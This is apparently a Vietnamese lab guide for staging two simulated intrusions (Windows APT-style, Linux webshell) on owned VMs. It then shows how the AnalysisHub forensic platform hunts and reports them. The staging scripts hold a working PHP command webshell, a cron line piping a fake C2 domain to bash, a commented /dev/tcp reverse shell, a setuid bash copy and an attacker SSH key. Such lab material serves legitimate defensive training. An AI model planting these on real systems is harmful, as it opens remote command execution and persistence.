# AnalysisHub — 2 Kịch bản Hunting Full cho Báo cáo Demo

> Mục tiêu: dựng **2 tình huống xâm nhập có thật** trên 2 VM (1 Linux server + 1 Windows),
> rồi dùng **AnalysisHub điều tra full từ A→Z** để quay demo và xuất báo cáo sự cố.
>
> Toàn bộ dấu vết tấn công dùng **marker vô hại** (EICAR, file rỗng, chuỗi giả `mimikatz`,
> webshell test) — **không có payload phá hoại thật**. Chỉ chạy trên VM bạn sở hữu / được phép.

Ngày dựng tài liệu: 2026-07-22 · Nền tảng: AnalysisHub (backend Go, agent Go, ELK, Volatility sandbox)

---

## 0. Chuẩn bị chung (làm 1 lần)

### 0.1. Lab & mạng
| Thành phần | Vai trò | Ghi chú |
|---|---|---|
| **AnalysisHub server** | Console điều tra (Docker Compose) | `docker compose up -d --build`, mở `http://<host>:3000` |
| **VM Windows** (Win10/11 hoặc Server) | Endpoint bị "nhiễm" — Scenario A | Snapshot sạch trước khi dựng |
| **VM Linux server** (Ubuntu/Debian) | Web server bị "xâm nhập" — Scenario B | Snapshot sạch trước khi dựng |

- 3 máy phải **ping thấy nhau**; VM truy cập được cổng agent về server.
- **Snapshot "clean"** cả 2 VM **trước** khi dàn dựng → quay lại tái diễn demo nhiều lần.
- Trong `.env` server: để trống `PUBLIC_URL` nếu agent kết nối qua LAN/IP; nếu đặt domain thì VM phải resolve được.

### 0.2. Cài agent lên 2 VM
1. Console → **Endpoints & Tools → Agents → New Agent** → copy lệnh cài.
2. **Windows**: chạy `install.ps1` trong PowerShell **Administrator** (bắt buộc để đủ quyền forensic: MFT, prefetch, dump).
3. **Linux**: chạy `install.sh` bằng **root/sudo** (đủ quyền đọc `/etc/shadow`, `/proc`, systemd, cron…).
4. Chờ cả 2 hiện **Online** + có CPU/RAM/Disk realtime trong danh sách Agents.

### 0.3. Nạp "mồi" cho hệ thống tự đối chiếu (làm demo sáng nước hơn)
Trước khi tấn công, nạp sẵn IOC để mọi kết quả scan **tự tô đậm dòng khớp**:
- **Threat Intelligence → IOC Store → Bulk import** các IOC bạn sẽ dùng ở kịch bản, ví dụ:
  ```
  185.220.101.55        # "C2" IP giả (dùng chung 2 kịch bản)
  evil-update[.]com      # domain C2 (defang được hỗ trợ)
  44d88612fea8a8f36de82e1278abb02f   # md5 của EICAR
  ```
- **Tools**: upload sẵn 2 công cụ để dùng ở phần Scenario Hunting / Jobs:
  - **Loki** (IOC/YARA scanner) — Output globs `*.csv,*.log`, Result processor `loki`, bật **Auto-analyze on finish**.
  - **YARA Scanner** (đã có sẵn trong repo: `tools/yara-scanner/`) — dùng rule scenario có sẵn: `credential_theft.yar`, `persistence.yar`, `powershell.yar`, `ransomware.yar`, `webshell_base.yar`, `linux.yar`.
- Sigma: repo có sẵn `tools/sigma-rules/suspicious_mimikatz.yml` → dùng ở bước Sigma hunt của Scenario A.

### 0.4. Khung quy trình "Hunting Full" (áp dụng cho cả 2 kịch bản)
```
1. Create Case                → Overview → Case Manager
2. Gán agent (VM) vào Case
3. Edge Forensics — quét từng nguồn (tự snapshot vào Evidence + đối chiếu IOC)
4. Triage Collection (1 UAC/1 sudo) — gom trọn artifact
5. EVTX/Registry (Windows) hoặc Terminal/Files (Linux) — xác minh thủ công
6. YARA Scanner theo rule kịch bản
7. Scenario Hunting + Sigma — quét theo luật, kết quả gom về case
8. Collection Checklist + Playbook checklist — thu bằng chứng chuẩn IR
9. (Linux) ELK: đẩy log → hunt Event → elk_result cho AI
10. AI: "AI triage → timeline" + Case "Analyze Evidence" → findings có cấu trúc
11. AI Summary (tường thuật) → dựng Attack Timeline hoàn chỉnh
12. Xuất Incident Report (HTML/PDF) + Export STIX (IOC)
```
> Mỗi bước 3–11 đều **tự đổ bằng chứng/finding vào Case** → đến bước 12 báo cáo đã đầy dữ liệu.

---

## SCENARIO A — Windows: Xâm nhập kiểu APT (phishing → cred theft → persistence)

**Câu chuyện tấn công (storyline để có cái mà "hunt"):**
Nạn nhân mở tài liệu phishing → PowerShell download cradle kéo payload → dump credential (giả Mimikatz)
→ cài persistence (Run key + Scheduled Task) → recon lateral movement (SMB/RDP) → staging dữ liệu để exfil.

### A.1. MITRE ATT&CK map
| Giai đoạn | Kỹ thuật | ID |
|---|---|---|
| Initial Access | Phishing Attachment | T1566.001 |
| Execution | PowerShell | T1059.001 |
| Ingress Tool Transfer | Download cradle | T1105 |
| Credential Access | OS Credential Dumping (LSASS) | T1003.001 |
| Persistence | Registry Run Key | T1547.001 |
| Persistence | Scheduled Task | T1053.005 |
| Discovery | Remote System / Network Share | T1018 / T1135 |
| Lateral Movement | Remote Services (SMB/RDP) | T1021 |
| Collection | Archive Collected Data | T1560 |

### A.2. Dàn dựng dấu vết (chạy trên VM Windows — PowerShell Administrator)
> An toàn: chỉ tạo file marker, Run key, scheduled task trỏ tới lệnh vô hại, và EICAR test.

```powershell
# --- T1105/T1059.001: mô phỏng download cradle để lại prefetch/powershell log ---
powershell -NoP -W Hidden -C "IEX (New-Object Net.WebClient); Write-Host 'sim-cradle'"
# (chạy vài lần để prefetch ghi run_count > 1)

# --- Payload giả trong thư mục staging attacker hay dùng ---
New-Item -ItemType Directory -Force "C:\ProgramData\svchost" | Out-Null
# EICAR (AV test string) — để YARA/Loki/AV bắt được:
'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' |
  Set-Content "C:\ProgramData\svchost\updater.exe" -Encoding ASCII
# File giả "credential dump":
"sekurlsa::logonpasswords`nprivilege::debug`nmimikatz # exit" |
  Set-Content "C:\ProgramData\svchost\creds.txt"

# --- T1547.001: Persistence Run key ---
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinUpdater `
  /t REG_SZ /d "C:\ProgramData\svchost\updater.exe" /f

# --- T1053.005: Persistence Scheduled Task ---
schtasks /Create /TN "MicrosoftEdgeUpdateSvc" /SC MINUTE /MO 30 `
  /TR "powershell -w hidden -c IEX 'sim-beacon'" /F

# --- T1018/T1135: Discovery (để lại prefetch + command history) ---
net view; net group "Domain Admins" /domain 2>$null; arp -a
Get-SmbShare 2>$null

# --- T1560: Staging archive để exfil ---
Compress-Archive -Path "C:\Users\*\Documents" `
  -DestinationPath "C:\ProgramData\svchost\loot.zip" -Force -EA SilentlyContinue

# --- Sinh vài event logon để EVTX có cái xem (4624/4625) ---
1..3 | % { runas /user:nonexistent whoami 2>$null }  # tạo 4625 (logon fail)
```
> Ghi lại **thời điểm bắt đầu** (giờ máy) — sẽ dùng làm "incident window" khi hunt.

### A.3. Hunting Full bằng AnalysisHub (đây là phần quay demo chính)

**B1 — Case & gán agent**
- Case Manager → **New Case**: `IR-2026-A Windows Intrusion` → mở case → gán agent VM Windows.

**B2 — Edge Forensics (Agents → [VM Win] → Edge Forensics)** — chạy lần lượt, mỗi tab **Run Scan**:
| Tab | Kỳ vọng phát hiện | ATT&CK |
|---|---|---|
| **Processes** | powershell hidden, tiến trình không path/parent lạ | T1059.001 |
| **Autoruns** | `WinUpdater` Run key + task `MicrosoftEdgeUpdateSvc` | T1547.001 / T1053.005 |
| **Prefetch** | `POWERSHELL.EXE` run_count cao, `updater.exe` mới chạy | T1059/T1204 |
| **Shimcache / Amcache** | bằng chứng thực thi `updater.exe` | T1204 |
| **Loaded DLLs** | cờ nghi ngờ injection/hijack (nếu có) | T1055 |
| **File Forensics (MFT)** | `updater.exe`, `creds.txt`, `loot.zip` + hash + timestamp NTFS | T1560 |
| **Network** | kết nối/`arp` tới IP mồi 185.220.101.55 (nếu bạn thêm) | T1071 |
| **Browser** | (nếu mô phỏng tải file qua trình duyệt) | T1105 |

> Với mỗi tab: tick dòng nghi ngờ → **Save to Case + promote IOC** hoặc **AI triage → timeline**.
> Mỗi lần Run Scan **tự lưu snapshot vào Evidence Store** (dấu vết điều tra, chain-of-custody).

**B3 — Triage Collection**: nút **Triage Collection** → gom processes/autoruns/shimcache/prefetch/dlls/netconn/browser trong **1 UAC**. Bằng chứng gọn cho báo cáo.

**B4 — EVTX Logs + Registry Viewer**:
- EVTX: lọc **4625** (logon fail), **4697** (service install), **4104** (PowerShell scriptblock) → đối chiếu incident window.
- Registry Viewer: mở `HKLM\...\Run` xác minh giá trị `WinUpdater`.

**B5 — YARA Scanner (tab Scanner)**: chọn kịch bản **credential_theft** + **persistence** + **powershell** → quét `C:\ProgramData`, `C:\Users`. EICAR + `creds.txt` sẽ match → report.html tự vào Evidence (`kind=artifact`).

**B6 — Scenario Hunting + Sigma**:
- Tạo scenario `Windows Intrusion Hunt`, gắn tool **Loki** (+YARA) → **Deploy** xuống VM Win (chọn case). Loki quét → CSV kết quả tự thu → **Auto-analyze** rút finding.
- **Sigma**: nạp `tools/sigma-rules/suspicious_mimikatz.yml` → quét → hit trên `creds.txt`/command line.

**B7 — Collection Checklist + Playbook**:
- **Collection Checklist** (platform = win, Phase 1) → dispatch song song → toàn bộ run lưu thành 1 evidence.
- **Playbooks → Security Assessment & Hunting (HUNT_WIN)**: patch, admin group, process+netstat (C2), Run keys+schtasks, quick Event ID hunt.

**B8 — AI dựng findings & timeline**:
- Case → **Analyze Evidence** (AI quét mọi job/scan trong case → findings có MITRE, confidence, evidence → 1 timeline chung).
- Bổ sung **AI triage** từ các dòng Edge Forensics đã tick.
- Case → **AI Summary** → tường thuật chuỗi tấn công.

**B9 — Báo cáo**: Case → **Incident Report** (HTML/PDF) + **Export STIX** (IOC: IP/domain/hash/Run key/task).

---

## SCENARIO B — Linux server: Xâm nhập web server (webshell → persistence → privesc)

**Storyline:** web app dính lỗ hổng upload → webshell → reverse shell → persistence bằng cron + systemd
→ backdoor SSH authorized_keys → soi SUID để privesc → staging dữ liệu ở `/tmp`, `/dev/shm` để exfil.

### B.1. MITRE ATT&CK map
| Giai đoạn | Kỹ thuật | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing App | T1190 |
| Persistence/Exec | Web Shell | T1505.003 |
| Execution | Unix Shell / reverse shell | T1059.004 |
| Persistence | Cron job | T1053.003 |
| Persistence | systemd service | T1543.002 |
| Persistence | SSH authorized_keys | T1098.004 |
| Priv Esc | Setuid/Setgid abuse | T1548.001 |
| C2 | Application Layer Protocol | T1071 |
| Exfil / Collection | Staging + Exfil | T1074 / T1041 |

### B.2. Dàn dựng dấu vết (chạy trên VM Linux — root/sudo)
> An toàn: webshell test không kết nối ra ngoài; "reverse shell" chỉ là chuỗi trong cron/script; EICAR làm mồi AV.

```bash
# --- T1190/T1505.003: webshell trong web root ---
sudo mkdir -p /var/www/html/uploads
cat << 'EOF' | sudo tee /var/www/html/uploads/up.php >/dev/null
<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } // simple webshell test ?>
EOF
# EICAR làm mồi cho YARA/ClamAV:
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
  | sudo tee /var/www/html/uploads/shell.bin >/dev/null

# --- T1059.004: script "reverse shell" giả trong thư mục world-writable ---
cat << 'EOF' | sudo tee /dev/shm/.x >/dev/null
#!/bin/bash
# bash -i >& /dev/tcp/185.220.101.55/4444 0>&1   (mô phỏng, KHÔNG chạy thật)
echo sim-beacon
EOF
sudo chmod +x /dev/shm/.x

# --- T1053.003: persistence cron (world-writable + suspicious-command) ---
echo '*/10 * * * * root curl -s http://evil-update.com/x | bash  # sim' \
  | sudo tee /etc/cron.d/apache-update >/dev/null

# --- T1543.002: persistence systemd ---
cat << 'EOF' | sudo tee /etc/systemd/system/sysupdate.service >/dev/null
[Unit]
Description=System Update Helper
[Service]
ExecStart=/dev/shm/.x
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable sysupdate.service 2>/dev/null

# --- T1098.004: SSH backdoor key ---
sudo mkdir -p /root/.ssh && sudo chmod 700 /root/.ssh
echo 'ssh-rsa AAAAB3Nz...ATTACKERKEY... attacker@evil' \
  | sudo tee -a /root/.ssh/authorized_keys >/dev/null

# --- T1548.001: SUID binary bất thường (bản copy bash có setuid) ---
sudo cp /bin/bash /tmp/.bd && sudo chmod 4755 /tmp/.bd

# --- T1074: staging dữ liệu để exfil ---
sudo tar czf /tmp/.loot.tgz /etc/passwd /etc/hostname 2>/dev/null

# --- Sinh log auth để ELK/hunt có cái xem ---
ssh nonexistent@localhost 2>/dev/null   # tạo dòng "Failed password" trong auth.log
```
> Ghi lại thời điểm bắt đầu để làm incident window.

### B.3. Hunting Full bằng AnalysisHub

> ⚠️ Lưu ý nền tảng (rút từ code agent): trên Linux, Edge Forensics **MFT / Prefetch / Shimcache
> KHÔNG hỗ trợ** (Windows-only). Trên Linux dùng: **Processes, Autoruns (systemd/cron/rc/profile/XDG),
> Network, Browser**, kết hợp **Terminal / Files / YARA / ELK**. Đây là điểm nên nói rõ trong demo để
> thể hiện platform-awareness.

**B1 — Case & agent**: New Case `IR-2026-B Linux Webserver` → gán agent VM Linux.

**B2 — Edge Forensics (những tab hỗ trợ Linux)**:
| Tab | Kỳ vọng phát hiện | ATT&CK |
|---|---|---|
| **Autoruns** | cron `apache-update` (cờ `suspicious-command`), systemd `sysupdate.service` (ExecStart `/dev/shm/.x` → cờ `exec-from-world-writable`) | T1053.003 / T1543.002 |
| **Processes** | process chạy từ `/tmp`, `/dev/shm`; con của webserver | T1059.004 |
| **Network** | kết nối tới IP mồi / cổng lạ | T1071 |

> Autoruns Linux tự gắn cờ `suspicious-command` (curl/wget/bash -i/nc/base64…) và `exec-from-world-writable` (/tmp, /dev/shm, /var/tmp) — chính là 2 mồi ta cài. Tick → **Save to Case + promote IOC**.

**B3 — Triage Collection**: gom processes/autoruns/netconn trong 1 lượt sudo → 1 evidence.

**B4 — Terminal + Files (xác minh thủ công, quay demo trực quan)**:
- **Files**: duyệt `/var/www/html/uploads` → thấy `up.php`, `shell.bin` → tải về làm bằng chứng.
- **Terminal**: `find / -perm -4000 -type f 2>/dev/null` (thấy `/tmp/.bd`), `cat /root/.ssh/authorized_keys`, `ls -la /dev/shm`.

**B5 — YARA Scanner**: chọn kịch bản **linux** + **webshell_base** → quét `/var/www`, `/tmp`, `/dev/shm`. `up.php`, EICAR sẽ match → report vào Evidence.

**B6 — Scenario Hunting**: scenario `Linux Webserver Hunt` gắn **Loki** (linux) → Deploy xuống VM → CSV thu về → Auto-analyze.

**B7 — Collection Checklist + Playbook (platform = linux)**:
- **Collection Checklist Phase 1 LIN**: system info, staging dirs (`/tmp /var/tmp /dev/shm`), user artifacts.
- **Playbooks → Security Assessment & Hunting (HUNT_LIN)** hoặc **Webshell & Backdoor Hunting**.
- (Tuỳ chọn) **Compliance Audit** section A/B để show năng lực audit: UID 0, sudoers, listening ports, SUID.

**B8 — ELK Hunting (điểm nhấn riêng của Linux)**:
- **ELK → Log Ingest**: đẩy `/var/log/auth.log`, `/var/log/syslog`, access log web vào Elasticsearch.
- Hunt trong Kibana / logsearch: `Failed password`, request tới `/uploads/up.php?cmd=`, cron exec.
- Kết quả hunt → gửi AI qua nguồn **`elk_result`** để rút finding.

**B9 — AI findings & timeline**: Case → **Analyze Evidence** → findings (MITRE, confidence) → timeline; **AI Summary** tường thuật.

**B10 — Báo cáo**: **Incident Report** + **Export STIX** (webshell path, C2 IP/domain, cron, systemd unit, SSH key, SUID `/tmp/.bd`).

---

## Kịch bản quay demo (gợi ý ~15–20 phút/VM)

| Phút | Nội dung | Tính năng AnalysisHub thể hiện |
|---|---|---|
| 0–2 | Bối cảnh + Dashboard: agent online, CPU/RAM realtime | Dashboard, Agents, System Health |
| 2–6 | Edge Forensics: quét từng nguồn, IOC tô đậm, tick → save/AI triage | Edge Forensics + IOC auto-match + Evidence snapshot |
| 6–9 | Triage Collection / EVTX / Terminal-Files | Triage, EVTX Viewer / Terminal, Files |
| 9–12 | YARA + Scenario Hunting + Sigma (Win) / ELK hunt (Linux) | Scanner, Scenario Hunting, Sigma, ELK |
| 12–15 | Checklist + Playbook chạy song song | Collection Checklist, Playbooks |
| 15–18 | AI: Analyze Evidence → findings → Timeline → AI Summary | AI Analysis (MAP/REDUCE, MITRE, confidence) |
| 18–20 | Incident Report (HTML/PDF) + Export STIX | Reporting, STIX |

---

## Checklist "đã cover full" (tick khi demo)

**Thu thập / điều tra**
- [ ] Agent online 2 VM + telemetry
- [ ] Edge Forensics: mọi tab hỗ trợ đã Run Scan + snapshot Evidence
- [ ] Triage Collection 1 lượt elevated
- [ ] EVTX + Registry (Win) / Terminal + Files (Linux)
- [ ] YARA Scanner theo rule kịch bản (match EICAR/webshell/creds)
- [ ] Scenario Hunting deploy (Loki) + Auto-analyze
- [ ] Sigma hunt (Win) / ELK hunt + elk_result (Linux)
- [ ] Collection Checklist + Playbook checklist chạy xong

**Phân tích / báo cáo**
- [ ] IOC Store: IOC mồi tự đối chiếu, promote IOC từ scan
- [ ] AI: Analyze Evidence → findings có MITRE + confidence
- [ ] Attack Timeline dựng đủ các giai đoạn ATT&CK
- [ ] AI Summary tường thuật
- [ ] Incident Report xuất HTML/PDF
- [ ] Export STIX

**Điểm cộng khi thuyết trình**
- [ ] Chain-of-custody: mỗi evidence có SHA-256 + command line + exit code
- [ ] Platform-awareness: nêu rõ MFT/Prefetch/Shimcache là Windows-only
- [ ] Self-Heal / System Health: cho xem updater retry, stuck-job watcher
- [ ] Offline Bundle: (tuỳ chọn) demo 1 VM ở chế độ air-gapped → import report

---

## Phụ lục — Reset lab về sạch
```powershell
# Windows
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinUpdater /f
schtasks /Delete /TN "MicrosoftEdgeUpdateSvc" /F
Remove-Item -Recurse -Force "C:\ProgramData\svchost"
```
```bash
# Linux
sudo systemctl disable --now sysupdate.service; sudo rm -f /etc/systemd/system/sysupdate.service
sudo rm -f /etc/cron.d/apache-update /dev/shm/.x /tmp/.bd /tmp/.loot.tgz
sudo rm -rf /var/www/html/uploads
sudo sed -i '/ATTACKERKEY/d' /root/.ssh/authorized_keys
```
> Hoặc đơn giản nhất: **khôi phục snapshot "clean"** đã tạo ở mục 0.1.
